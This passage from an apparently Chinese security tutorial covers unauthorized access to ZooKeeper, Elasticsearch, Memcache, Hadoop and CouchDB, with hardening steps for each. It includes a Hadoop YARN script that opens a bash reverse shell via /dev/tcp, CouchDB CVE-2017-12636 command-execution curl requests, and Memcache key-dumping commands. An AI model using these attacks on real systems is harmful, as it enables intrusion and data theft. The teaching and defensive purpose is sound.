<p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a><br><a href="https://www.youtube.com/watch?v=R6-nXCVNxEw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=R6-nXCVNxEw</a></p>
<h4 id="4-防范措施"><a href="#4-防范措施" class="headerlink" title="4. 防范措施"></a><strong>4. 防范措施</strong></h4><p><strong>(1).新建管理账户开启MongoDB授权</strong><br>新建终端[参数默认可以不加，若有自定义参数，才要加上，下同]<br><code>mongod --port 27017 --dbpath /data/db1</code></p>
<p>另起一个终端，运行下列命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mongo --port 27017</span><br><span class="line"></span><br><span class="line">  use admin</span><br><span class="line"></span><br><span class="line">  db.createUser(</span><br><span class="line">    &#123;</span><br><span class="line">      user: &quot;adminUser&quot;,</span><br><span class="line">      pwd: &quot;adminPass&quot;,</span><br><span class="line">      roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ]</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>

<p>管理员创建成功，现在拥有了用户管理员 用户名:adminUser 密码:adminPass</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7qn8be1j31l70u0u0x.jpg" alt="img"></p>
<p><strong>(2).本地访问</strong><br>bind 127.0.0.1</p>
<p><strong>(3).修改默认端口</strong><br>修改默认的mongoDB端口(默认为: TCP 27017)为其他端口</p>
<p><strong>(4).禁用HTTP和REST端口</strong><br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface = false<br><strong>(5).开启日志审计功能</strong><br>审计功能可以用来记录用户对数据库的所有相关操作。这些记录可以让系统管理员在需要的时候分析数据库在什么时段发生了什么事情<br><strong>(6).开启auth认证</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;mongodb.conf　　</span><br><span class="line">auth &#x3D; true</span><br></pre></td></tr></table></figure>

<p>其他:<a href="http://www.mottoin.com/105609.html" target="_blank" rel="noopener">http://www.mottoin.com/105609.html</a></p>
<h2 id="0x04-ZooKeeper未授权访问"><a href="#0x04-ZooKeeper未授权访问" class="headerlink" title="0x04 ZooKeeper未授权访问"></a>0x04 ZooKeeper未授权访问</h2><p>From: <a href="http://www.polaris-lab.com/index.php/archives/41/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/41/</a><br><a href="http://www.majunwei.com/category/201612011952003333/" target="_blank" rel="noopener">http://www.majunwei.com/category/201612011952003333/</a><br><a href="http://www.mottoin.com/92742.html" target="_blank" rel="noopener">http://www.mottoin.com/92742.html</a><br><a href="http://cve.scap.org.cn/CVE-2014-0085.html" target="_blank" rel="noopener">http://cve.scap.org.cn/CVE-2014-0085.html</a><br><a href="http://ifeve.com/zookeeper_guidetozkoperations/" target="_blank" rel="noopener">http://ifeve.com/zookeeper_guidetozkoperations/</a><br><a href="http://blog.csdn.net/u011721501/article/details/44062617" target="_blank" rel="noopener">http://blog.csdn.net/u011721501/article/details/44062617</a></p>
<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
<h4 id="1-扫描探测-3"><a href="#1-扫描探测-3" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br><code>./zkCli.sh -server 127.0.0.1 2181</code></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ri7ikpj31it0u0kjn.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0&#x2F;24  </span><br><span class="line">grep &quot;Ports: 2181&#x2F;open&#x2F;tcp&quot; zookeeper.gnmap | cut -f 2 -d &#39; &#39; &gt; Live.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7rwv08mj31th0u0qv5.jpg" alt="img"></p>
<h4 id="2-攻击获取信息"><a href="#2-攻击获取信息" class="headerlink" title="2.攻击获取信息"></a><strong>2.攻击获取信息</strong></h4><ul>
<li>stat：列出关于性能和连接的客户端的统计信息。<br>echo stat |ncat 127.0.0.1 2181</li>
<li>ruok：测试服务器是否运行在非错误状态。<br>echo ruok |ncat 127.0.0.1 2181</li>
<li>reqs：列出未完成的请求。<br>echo reqs |ncat 127.0.0.1 2181</li>
<li>envi：打印有关服务环境的详细信息。<br>echo envi |ncat 127.0.0.1 2181</li>
</ul>
<p>dump：列出未完成的会话和临时节点。<br>echo dump |ncat 127.0.0.1 2181</p>
<h4 id="3-防范措施"><a href="#3-防范措施" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><ul>
<li>禁止把Zookeeper直接暴露在公网</li>
<li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</li>
</ul>
<h2 id="0x05-Elasticsearch未授权访问"><a href="#0x05-Elasticsearch未授权访问" class="headerlink" title="0x05 Elasticsearch未授权访问"></a>0x05 Elasticsearch未授权访问</h2><p>ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。</p>
<h4 id="1-熟悉的响应-You-Know-for-Search"><a href="#1-熟悉的响应-You-Know-for-Search" class="headerlink" title="1.熟悉的响应 You Know, for Search"></a><strong>1.熟悉的响应</strong> You Know, for Search</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ curl http:&#x2F;&#x2F;127.0.0.1:9200&#x2F;_cat&#x2F;indices&#x2F;</span><br><span class="line"></span><br><span class="line">&#123; &quot;status&quot; : 200, &quot;name&quot; : &quot;Flake&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;version&quot; : &#123;&quot;number&quot; : &quot;1.4.1&quot;,&quot; &quot;build_hash&quot; : &quot;b88f43fc40b0bcd7f173xxxxx2e97816de80b19&quot;, &quot;build_timestamp&quot; : &quot;2015-07-29T09:54:16Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;4.10.4&quot;&#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a><strong>2.漏洞测试</strong></h4><p>安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br><code>http://localhost:9200/_cat/indices</code> 里面的indices包含了_river一般就是安装了river了。</p>
<p><a href="http://localhost:9200/_plugin/head/" target="_blank" rel="noopener">http://localhost:9200/_plugin/head/</a> web管理界面<br><a href="http://localhost:9200/_cat/indices" target="_blank" rel="noopener">http://localhost:9200/_cat/indices</a><br><a href="http://localhost:9200/_river/_search" target="_blank" rel="noopener">http://localhost:9200/_river/_search</a> 查看数据库敏感信息<br><a href="http://localhost:9200/_nodes" target="_blank" rel="noopener">http://localhost:9200/_nodes</a> 查看节点数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t0lki6j31yh0sbx6q.jpg" alt="img"><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7t9vlvxj31jl0u01kx.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def Elasticsearch_check(ip, port&#x3D;9200, timeout&#x3D;5):</span><br><span class="line">    try:</span><br><span class="line">    　　url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+str(port)+&quot;&#x2F;_cat&quot;</span><br><span class="line">    　　response &#x3D; requests.get(url) </span><br><span class="line">    except:</span><br><span class="line">    　　pass</span><br><span class="line">    if &quot;&#x2F;_cat&#x2F;master&quot; in response.content:</span><br><span class="line">    　　print &#39;[+] Elasticsearch Unauthorized: &#39; +ip+&#39;:&#39;+str(port)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.secpulse.com/archives/46394.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/46394.html</a></p>
<h4 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a><strong>3.漏洞修复</strong></h4><p>(1)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 9200 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 9200 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>

<p>(2)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。<br><a href="https://www.jianshu.com/p/7ec26c13abbb" target="_blank" rel="noopener">https://www.jianshu.com/p/7ec26c13abbb</a><br><a href="https://www.sojson.com/blog/213.html" target="_blank" rel="noopener">https://www.sojson.com/blog/213.html</a><br>(3)、限制IP访问，绑定固定IP<br>(4)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.basic.enabled     true     ##开关，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user     &quot;admin&quot;     ##账号</span><br><span class="line">http.basic.password     &quot;admin_pw&quot;     ##密码</span><br><span class="line">http.basic.ipwhitelist     [&quot;localhost&quot;, &quot;127.0.0.1&quot;]     ##白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</span><br><span class="line">http.basic.trusted_proxy_chains     []     ##信任代理列表</span><br><span class="line">http.basic.log     false     ##把无授权的访问事件添加到ES的日志</span><br><span class="line">http.basic.xforward     &quot;&quot;     ##记载代理路径的header字段名</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf" target="_blank" rel="noopener">https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf</a><br><a href="https://blog.csdn.net/u011419453/article/details/39395627" target="_blank" rel="noopener">https://blog.csdn.net/u011419453/article/details/39395627</a></p>
<h2 id="0x06-Memcache未授权访问"><a href="#0x06-Memcache未授权访问" class="headerlink" title="0x06 Memcache未授权访问"></a>0x06 Memcache未授权访问</h2><p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p>
<h4 id="1-扫描探测-4"><a href="#1-扫描探测-4" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tmj9xnj31uc0t64qp.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line">def Memcache_check(ip, port&#x3D;11211, timeout&#x3D;5):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;stats\r\n&quot;)</span><br><span class="line">        result &#x3D; s.recv(1024)</span><br><span class="line">        if &quot;STAT version&quot; in result:</span><br><span class="line">            print &#39;[+] Memcache Unauthorized: &#39; +ip+&#39;:&#39;+str(port)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="2-攻击利用-1"><a href="#2-攻击利用-1" class="headerlink" title="2.攻击利用"></a><strong>2.攻击利用</strong></h4><p><strong>2.1 基础部分</strong></p>
<p>通过一个<code>cheat sheet</code>了解一下Memcached的协议。Memcached的语法由如下元素组成</p>
<ul>
<li>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</li>
</ul>
<p>command字段有如下几条命令</p>
<ul>
<li>存储操作(set, add, replace, append, prepend, cas)</li>
<li>检索操作 (get, gets)</li>
<li>删除操作 (delete)</li>
<li>增减操作 (incr, decr)</li>
<li>touch</li>
<li>slabs reassign</li>
<li>slabs automove</li>
<li>lru_crawler</li>
<li>统计操作(stats items, slabs, cachedump)</li>
<li>其他操作 (version, flush_all, quit)</li>
</ul>
<hr>
<table>
<thead>
<tr>
<th>Command</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>get</td>
<td>读某个值</td>
<td>get mykey</td>
</tr>
<tr>
<td>set</td>
<td>强制设置某个键值</td>
<td>set mykey 0 60 5</td>
</tr>
<tr>
<td>add</td>
<td>添加新键值对</td>
<td>add newkey 0 60 5</td>
</tr>
<tr>
<td>replace</td>
<td>覆盖已经存在的key</td>
<td>replace key 0 60 5</td>
</tr>
<tr>
<td>flush_all</td>
<td>让所有条目失效</td>
<td>flush_all</td>
</tr>
<tr>
<td>stats</td>
<td>打印当前状态</td>
<td>stats</td>
</tr>
<tr>
<td>stats malloc</td>
<td>打印内存状态</td>
<td>stats malloc</td>
</tr>
<tr>
<td>version</td>
<td>打印Memcached版本</td>
<td>version</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stats  &#x2F;&#x2F;查看memcache 服务状态</span><br><span class="line">stats items  &#x2F;&#x2F;查看所有items</span><br><span class="line">stats cachedump 32 0  &#x2F;&#x2F;获得缓存key</span><br><span class="line">get :state:264861539228401373:261588   &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure>

<p><strong>2.2 建立连接并获取信息</strong><br><code>telnet &lt;target&gt; 11211</code>，或<code>nc -vv &lt;target&gt; 11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7tw45o0j31e10u0e4c.jpg" alt="img"></p>
<p>附赠大佬写的文章 <a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">Discuz!因Memcached未授权访问导致的RCE</a></p>
<hr>
<h4 id="3-防范措施-1"><a href="#3-防范措施-1" class="headerlink" title="3.防范措施"></a><strong>3.防范措施</strong></h4><p><em>1.限制访问</em><br>如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：<br><code>memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
<p>或者 vim /etc/sysconfig/memcached，修改配置文件<br><em><code>OPTIONS=&quot;-l 127.0.0.1&quot;</code></em>，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload</p>
<p><em>2.防火墙</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; accept</span><br><span class="line">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; drop</span><br><span class="line">## iptables -I INPUT -p tcp --dport 11211 -j DROP</span><br><span class="line">## iptables -I INPUT -p udp --dport 11211 -j DROP</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 保存规则并重启 iptables</span><br><span class="line">## service iptables save</span><br><span class="line">## service iptables restart</span><br></pre></td></tr></table></figure>

<p><em>3.使用最小化权限账号运行Memcached服务</em><br>使用普通权限账号运行，指定Memcached用户。<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
<p><em>4.启用认证功能</em><br>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX##saslauthd" target="_blank" rel="noopener">SASL认证详细配置手册</a></p>
<p><em>5.修改默认端口</em><br>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：<br><code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></p>
<p><em>6.定期升级</em></p>
<p>参考:<br><a href="http://lzone.de/cheat-sheet/memcached" target="_blank" rel="noopener">http://lzone.de/cheat-sheet/memcached</a><br><a href="https://www.secpulse.com/archives/49659.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/49659.html</a><br><a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/" target="_blank" rel="noopener">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a><br><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a><br><a href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/" target="_blank" rel="noopener">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a><br><a href="https://xz.aliyun.com/t/2018" target="_blank" rel="noopener">https://xz.aliyun.com/t/2018</a><br><a href="http://drops.xmd5.com/static/drops/web-8987.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/web-8987.html</a><br><a href="https://blog.csdn.net/microzone/article/details/79262549" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/79262549</a></p>
<h2 id="0x07-Hadoop未授权访问"><a href="#0x07-Hadoop未授权访问" class="headerlink" title="0x07 Hadoop未授权访问"></a>0x07 Hadoop未授权访问</h2><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p>
<ul>
<li>用户创建一个处理键值的map函数</li>
<li>产生了一套中间键/值</li>
<li>reduce函数合并中间值并把他们关联到对应的键</li>
</ul>
<h4 id="1-扫描探测-5"><a href="#1-扫描探测-5" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p><strong>1.1 常见端口</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" alt="img"></a></p>
<p><strong>1.2 敏感端口</strong></p>
<table>
<thead>
<tr>
<th>模块</th>
<th>节点</th>
<th>默认端口</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>NameNode</td>
<td>50070</td>
</tr>
<tr>
<td>HDFS</td>
<td>SecondNameNode</td>
<td>50090</td>
</tr>
<tr>
<td>HDFS</td>
<td>DataNode</td>
<td>50075</td>
</tr>
<tr>
<td>HDFS</td>
<td>Backup/Checkpoint node</td>
<td>50105</td>
</tr>
<tr>
<td>MapReduce</td>
<td>JobTracker</td>
<td>50030</td>
</tr>
<tr>
<td>MapReduce</td>
<td>TaskTracker</td>
<td>50060</td>
</tr>
</tbody></table>
<p>通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7ud5stsj31jo0u0b29.jpg" alt="img"></p>
<h4 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2. 攻击手法"></a><strong>2. 攻击手法</strong></h4><p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 <a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">REST API</a> 也可以提交任务执行。</p>
<p>利用过程如下：</p>
<ul>
<li>在本地监听等待反弹 shell 连接</li>
<li>调用 New Application API 创建 Application</li>
<li>调用 Submit Application API 提交</li>
</ul>
<p><strong>P牛的攻击脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;192.168.0.1&#39; ## put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;get-shell&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7uy0e3bj31ua0u0u0x.jpg" alt="img"></p>
<h4 id="3-防范措施-2"><a href="#3-防范措施-2" class="headerlink" title="3. 防范措施"></a><strong>3. 防范措施</strong></h4><p><em>1. 网络访问控制</em><br>使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。</p>
<p><em>2. 启用认证功能</em><br>启用 Kerberos 认证功能。</p>
<p><em>3. 更新补丁</em><br>不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。</p>
<h2 id="0x08-CouchDB未授权访问"><a href="#0x08-CouchDB未授权访问" class="headerlink" title="0x08 CouchDB未授权访问"></a>0x08 CouchDB未授权访问</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。<br>CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[query_servers]</span><br><span class="line">LANGUAGE &#x3D; PATH ARGS</span><br><span class="line">默认情况下，配置文件中已经设置了两个query_servers:</span><br><span class="line"></span><br><span class="line">[query_servers]</span><br><span class="line">javascript &#x3D; &#x2F;usr&#x2F;bin&#x2F;couchjs &#x2F;usr&#x2F;share&#x2F;couchdb&#x2F;server&#x2F;main.js</span><br><span class="line">coffeescript &#x3D; &#x2F;usr&#x2F;bin&#x2F;couchjs &#x2F;usr&#x2F;share&#x2F;couchdb&#x2F;server&#x2F;main-coffee.js</span><br></pre></td></tr></table></figure>

<p>可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了</p>
<p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a><br><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p>
<p><em><code>影响版本：小于 1.7.0 以及 小于 2.1.1</code></em></p>
<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p>
<h4 id="1-扫描探测-6"><a href="#1-扫描探测-6" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><code>nmap -p 5984 --script &quot;couchdb-stats.nse&quot; 127.0.0.1</code><br><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7vwdk3vj31uc0t64qp.jpg" alt="img"></p>
<p><strong>2.两个版本的利用方式</strong></p>
<p><strong><em>(1) 1.6.0 下的说明\</em></strong></p>
<p>依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7w7fikvj31e10u0b29.jpg" alt="img">第一个请求是添加一个名字为cmd的query_servers，其值为<code>id &gt;/tmp/success</code>，这就是我们后面待执行的命令。<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p>
<hr>
<p><strong><em>(2) 2.1.0 下的说明\</em></strong></p>
<p>2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。<br>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_membership</span><br></pre></td></tr></table></figure>

<p>可见，我们这里只有一个node，名字是nonode@nohost。</p>
<p>然后，我们修改nonode@nohost的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;_node&#x2F;nonode@nohost&#x2F;_config&#x2F;query_servers&#x2F;cmd -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br></pre></td></tr></table></figure>

<p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view：</p>
